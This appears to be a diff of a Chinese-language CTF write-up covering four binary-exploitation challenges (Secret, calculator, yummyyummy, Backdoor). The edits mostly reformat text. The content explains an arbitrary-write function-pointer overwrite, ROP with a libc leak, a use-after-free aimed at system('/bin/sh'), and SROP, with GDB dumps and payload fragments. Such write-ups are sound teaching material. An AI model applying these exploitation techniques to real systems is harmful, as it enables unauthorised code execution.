@@ -27,7 +27,7 @@ tags: CTF
 
 > 寫的很長，可以直接往下滑看綠色框的內容，綠色框是解題邏輯，下面寫的是我的解題過程。剛剛 demo 發現其實有一些細節寫得不是很詳細，綠色方框下面我又補了實際操作
 
-`file`
+***file***
 
 ```sh
 Secret : ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bdd857945d4521a6a0ea022988f98642f0421868, for GNU/Linux 3.2.0, not stripped
@@ -36,7 +36,7 @@ Secret : ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
 
 > 有給 Source Code
 
-`Source code`
+***Source code***
 
 ```c
 #include <stdio.h>
@@ -116,34 +116,34 @@ int main(int argc, char **argv)
 }
 ```
 
-> 整體流程是 `main()` call `letter()`， `letter()` 接收127 bytes，然後接收兩個數字，分別為 num_1 and num_2，並且執行 `fun[num_1] += num_2;`
+> 整體流程是 ***main()*** call ***letter()***， ***letter()*** 接收127 bytes，然後接收兩個數字，分別為 num_1 and num_2，並且執行 ***fun[num_1] += num_2;***
 
 > 有趣的地方是這個 fun 是一個 pointer to int ，然後 index and value 可控，這樣就可以覆蓋到不應該覆蓋到的地方
 
 
 > c 語言的陣列其實是一種指標
-> * `fun[0] == *fun`
-> * `*(fun + 1) == fun[1]`
+> * ***fun[0] == *fun***
+> * ***\*(fun + 1) == fun[1]***
 
-這邊先記著我們有一個方法可以任意地址覆寫，繼續 trace code，可以看到接下來 call 了 `verify(number, strlen(number));` 而 `verify` 是一個 function pointer，指到的地方是 `secert()`，接下來看 `secert()` 的行為，目標很明確，我們需要讓 `lucky_number(number, len) == 48763333` 這個為真，才能印出 flag，那關鍵就會是 `lucky_number()`
+這邊先記著我們有一個方法可以任意地址覆寫，繼續 *trace code*，可以看到接下來 call 了 ***verify(number, strlen(number));*** 而 ***verify*** 是一個 *function pointer*，指到的地方是 ***secert()***，接下來看 ***secert()*** 的行為，目標很明確，我們需要讓 ***lucky_number(number, len) == 48763333*** 這個為真，才能印出 *flag*，那關鍵就會是 ***lucky_number()***
 
-可以知道 `lucky_number()` 是將我們第一次輸入的字符逐個與 `0xfe` xor 後放入 `sum`，並且 return `sum`，而這個 `sum` 要與 `48763333` 相等
+可以知道 ***lucky_number()*** 是將我們第一次輸入的字符逐個與 ***0xfe*** ***xor*** 後放入 ***sum***，並且 ***return sum***，而這個 ***sum 要與 48763333 相等***
 
-看起來其實不難，就是回推數值，基本上可以手算，或者自動的一個一個 try ，不過我想節省時間所以先去算他的 boundary，發現 `sum` 最大的可能會出現在每個累加的 bytes 都是1，也就是 ` sum += number[i] ^ 0xfe ; ` 中的 `number[i] ^ 0xfe` always 為 `0xff`，`0xff` 等於十進制的`255`，然後 loop 最多127次，這樣 sum 的最大值為 `255 * 127 = 32385`，遠不及我們想要的`48763333`
-
-
-好了，到這邊其實很明顯了，正常方式過不了，只能用到前面的任意位置複寫，然後要複寫的東西也很明顯，就是 `verify()` 的內容， `verify()`是一個 function pointer，也就是 `verify()` 所存的 data 是 `sercet()` 的 `address`，那我們只要把地址複寫跳過檢查的這個動作就可以x了，複寫的值就是 `sercet() + offset`，加上這個 offset 就是為了跳過檢查(`lucky_number(number, len) == 48763333`)的 address，這個可以用 `objdump -d` 去看組語，pattern 應該很明顯應該是 `cmp $register 48763333`，需要注意的是 constant(48763333) 應該是 hex 表示，蓋掉之後就可以 bypass 驗證，拿到 flag 了
-
-> 大致流程就是透過 `fun[num_1] = num_2` 達成任意位置複寫任意數值，`fun[num_1]` 要控成 verify() 的地址，然後使用 `num_2` 填入 `sercet() bypass address`，`sercet() bypass address` 的核心概念就是`lucky_number(number, len) == 48763333`的下一條指令地址，基本上我們就是要 bypass 這個指令的檢查，從而得到 flag
+看起來其實不難，就是回推數值，基本上可以手算，或者自動的一個一個 *try* ，不過我想節省時間所以先去算他的 *boundary*，發現 *sum* 最大的可能會出現在每個累加的 *bytes* 都是1，也就是 ***sum += number[i] ^ 0xfe ;*** 中的 ***number[i] ^ 0xfe*** always 為 ***0xff***，***0xff*** 等於十進制的***255***，然後 *loop* 最多*127*次，這樣 ***sum 的最大值為 255 * 127 = 32385***，遠不及我們想要的***48763333***
 
 
-> 流程是那樣，實際上你要找到 fun[0] 的 address，你需要把斷點下在 letter() (其實理論上哪裡都可以只要在 fun[num_1] = num_2 之前就行)
+好了，到這邊其實很明顯了，正常方式過不了，只能用到前面的任意位置複寫，然後要複寫的東西也很明顯，就是 ***verify()*** 的內容， ***verify()***是一個 *function pointer*，也就是 ***verify()*** 所存的 *data* 是 ***sercet()*** 的 ***address***，那我們只要把地址複寫跳過檢查的這個動作就可以 *x* 了，複寫的值就是 ***sercet() + offset***，加上這個 *offset* 就是為了跳過檢查(***lucky_number(number, len) == 48763333***)的 *address*，這個可以用 *objdump -d* 去看組語，*pattern* 應該很明顯應該是 ***cmp $register 48763333***，需要注意的是 *constant(48763333)* 應該是 *hex* 表示，蓋掉之後就可以 *bypass* 驗證，拿到 *flag* 了
+
+> 大致流程就是透過 ***fun[num_1] = num_2*** 達成任意位置複寫任意數值，***fun[num_1]*** 要控成 ***verify()*** 的地址，然後使用 ***num_2*** 填入 ***sercet() bypass address***，***sercet() bypass address*** 的核心概念就是 ***lucky_number(number, len) == 48763333***的下一條指令地址，基本上我們就是要 ***bypass*** 這個指令的檢查，從而得到 *flag*
+
+
+> 流程是那樣，實際上你要找到 *fun[0]* 的 *address*，你需要把斷點下在 letter() (其實理論上哪裡都可以只要在 fun[num_1] = num_2 之前就行)
 
 
 ![image](https://hackmd.io/_uploads/S1oMvD6n0.png)
 
 
-> 然後一直 `ni` 就可以看到 `0x555555558080 <fun>`
+> 然後一直 ***ni*** 就可以看到 `0x555555558080 <fun>`
 
 ![image](https://hackmd.io/_uploads/Hy5oDP6hA.png)
 
@@ -178,7 +178,7 @@ gef➤  x/50gx 0x555555558080 -0x50
 0x5555555581b0:	0x0000000000000000	0x0000000000000000
 ```
 
-> 第四行的 `0x555555558050 <verify>:	0x00005555555551f0	0x0000000000000000` 存放 `verify` 所指向的 function 也就是 sercet()，很明顯這是我們要覆寫的位置，那我們要覆寫什麼東西呢?
+> 第四行的 `0x555555558050 <verify>:	0x00005555555551f0	0x0000000000000000` 存放 ***verify*** 所指向的 *function* 也就是 ***sercet()***，很明顯這是我們要覆寫的位置，那我們要覆寫什麼東西呢?
 
 ```shell
 gef➤  x/50gx 0x00005555555551f0
@@ -209,7 +209,7 @@ gef➤  x/50gx 0x00005555555551f0
 0x555555555370 <letter+104>:	0x058d48c68948ffff	0xb8c7894800000e24
 ```
 
-> 原本存的是 `secret + 0` 的 address 所以會從 `secret + 0`  執行，但我們想 bypass 檢查，也就是 call `lucky number`那邊，所以我們把 value 改成 `secret + 79`，他就會 bypass 掉檢查了，然後因為是 `fun[num_1] += num_2` 所以我們只要輸入 offset(這邊的話就是 79) 就可以了
+> 原本存的是 ***secret + 0*** 的 *address* 所以會從 ***secret + 0***  執行，但我們想 *bypass* 檢查，也就是 call ***lucky number***那邊，所以我們把 value 改成 ***secret + 79***，他就會 bypass 掉檢查了，然後因為是 ***fun[num_1] += num_2*** 所以我們只要輸入 offset(這邊的話就是 79) 就可以了
 
 ```sh
 gef➤  x/50i 0x00005555555551f0
@@ -275,12 +275,13 @@ gef➤  x/50i 0x00005555555551f0
 
 
 ### 計算機
-`file`
+
+***file***
 
 ```sh
 calculator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bdd857945d4521a6a0ea022988f98642f0421868, for GNU/Linux 3.2.0, not stripped
 ```
-`checksec`
+***checksec***
 
 ```sh
 Canary                        : ✘ 
@@ -291,7 +292,7 @@ RelRO                         : Partial
 ```
 > Decompile
 
-`main`
+***main***
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -312,7 +313,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-`calcutator()`
+***calcutator()***
 
 ```c
 int calculator()
@@ -384,7 +385,7 @@ LABEL_17:
 }
 ```
 
-`goodbye()`
+***goodbye()***
 
 ```c
 signed __int64 goodbye()
@@ -399,10 +400,10 @@ signed __int64 goodbye()
   return 1LL;
 }
 ```
-> 我 leak 出 libc 位置，串好 ROP 才發現有留後門(`win`)
+> 我 leak 出 libc 位置，串好 ROP 才發現有留後門(***win***)
 
 
-`win`
+***win***
 
 ```c
 int __fastcall win(int a1)
@@ -439,7 +440,7 @@ int __fastcall win(int a1)
 }
 
 ```
-> 開 nx 沒 cannary，又看到 `get()`，差不多可以確定是 ROP，需要注意的是他需要一個參數，要記得pop 到 `$rdi`
+> 開 nx 沒 cannary，又看到 ***get()***，差不多可以確定是 ROP，需要注意的是他需要一個參數，要記得pop 到 ***$rdi***
 
 #### exploit
 
@@ -465,13 +466,13 @@ p.interactive()
 ---
 ### yummyyummy
 
-`file`
+***file***
 
 ```shell
 yummyyummy: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1a7eb96772e5da9f443d624c911601ca076ad299, not stripped
 ```
 
-`checksec`
+***checksec***
 
 
 ```shell
@@ -485,7 +486,8 @@ RelRO                         : Partial
 
 > Decompile
 
-`main`
+***main***
+
 ```c
 // local variable allocation has failed, the output may be wrong!
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -551,7 +553,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 > heap 題，保護機制全開
 
 
-16和55行只 free 不設 Null， Dangling pointer。存在 UAF，但16行才是重點，我原本的想法是把 *(ptr+1)設成 `system`，然後 `v3` 也就是第五次點餐的內容填成 `bin/sh`，這樣就可以 RCE!
+16和55行只 free 不設 Null， Dangling pointer。存在 UAF，但16行才是重點，我原本的想法是把 *(ptr+1)設成 ***system***，然後 ***v3*** 也就是第五次點餐的內容填成 ***/bin/sh***，這樣就可以 RCE!
 
 > 對，我又沒發現這題有 backdoor
 
@@ -595,23 +597,22 @@ p.sendlineafter('Order:', b'a' * 8  + p64(backdoor_addr))
 p.interactive()
 
 ```
-因為有開 PIE 第一次 leak `bye_func() address`，然後去反組譯(看/算) process 的 memory base，加上 offset 算出 `backdoor() address` ，其實第三次之後的 send payload 可以去要更大塊的 memory，這樣就不會動到原本擺好的 payload
+因為有開 PIE 第一次 *leak* ***bye_func() address***，然後去反組譯(看/算) *process* 的 *memory base*，加上 *offset* 算出 ***backdoor() address*** ，其實第三次之後的 *send payload* 可以去要更大塊的 *memory*，這樣就不會動到原本擺好的 *payload*
 
 
-> 題外話 這題的 source code 邏輯和張元 2019 pwn 講解 UAF 的例題一模一樣
 
 ---
 ### Backdoor
 
 
 
-`file`
+***file***
 
 ```sh
 backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e9846b36994720fc8b91e77d41cb86f197769fd, for GNU/Linux 3.2.0, not stripped\
 ```
 
-`checksec`
+***checksec***
 
 ```sh
 Canary                        : ✘ 
@@ -621,7 +622,7 @@ Fortify                       : ✘
 RelRO                         : ✘ 
 ```
 
-`objdump -d`
+***objdump -d***
 
 ```sh
 0000000000401106 <main>:
@@ -652,7 +653,7 @@ RelRO                         : ✘
   401170:	c3                   	ret
 ```
 
-> 三個 syscall，分別為印出(write `rax == 1`)特定資訊，以及讀入(read `rax == 0`) 0xdeadbeef 個 bytes
+> 三個 syscall，分別為印出(write)特定資訊，以及讀入(read) 0xdeadbeef 個 bytes
 
 
 ```sh
@@ -663,7 +664,7 @@ RelRO                         : ✘
 > 注意到這邊 stack 並沒有被撐開(感謝你的注意，沒什麼用的資訊)
 
 * ROPgadget --binary <binaryfile> --multibr
-> `--multibr` Enable multiple branch gadgets
+> ***--multib*** Enable multiple branch gadgets
 
 ```sh
 0x00000000004010e8 : adc esp, dword ptr [rdx] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
@@ -734,9 +735,9 @@ RelRO                         : ✘
 Unique gadgets found: 64
 ```
 
-> `objdump -d` 有找到一組 `syscall;ret` 位置在 `0x401165`
+> ***objdump -d*** 有找到一組 ***syscall;ret*** 位置在 `0x401165`
 
-> 這題是 SROP，核心概念是呼叫 `syscall` 前會把 `$register` 的值保存起來，然後進 kernal mode 執行，結束回到 user mode，把剛剛存起來的 `$register` pop 回去原本的位置，而我們就是透過修改保存那些`$register` 的地方的 value 達到 ROP，那最簡單的方法就是 `$rip` 設成 `system`，然後 `$rdi` 設成 "bin/sh" 但會遇到一些問題，一般不會有 "bin/sh" 字串，沒有就自己送，送過去的 bin/sh 會在 stack 上，stack 在哪? 想辦法 leak  `stack address`，觀察前面找出的 `gadget` 發現也沒辦法 leak 出 `stack address`
+> 這題是 SROP，核心概念是呼叫 ***syscall*** 前會把 ***$register*** 的值保存起來，然後進 kernal mode 執行，結束回到 user mode，把剛剛存起來的 ***$register*** pop 回去原本的位置，而我們就是透過修改保存那些 ***$register*** 的地方的 value 達到 *ROP*，那最簡單的方法就是 ***$rip*** 設成 ***system***，然後 ***$rdi*** 設成 ***"/bin/sh"*** 但會遇到一些問題，一般不會有 ***"/bin/sh"*** 字串，沒有就自己送，送過去的 ***"/bin/sh*** 會在 stack 上，stack 在哪? 想辦法 leak  ***stack address***，***觀察前面找出的 gadget 發現也沒辦法 leak 出 stack address***
 
 > 運氣很好的碰到熱心的學長，跟我說這題題如其名，他把我需要的東西藏在程式的某個地方
 
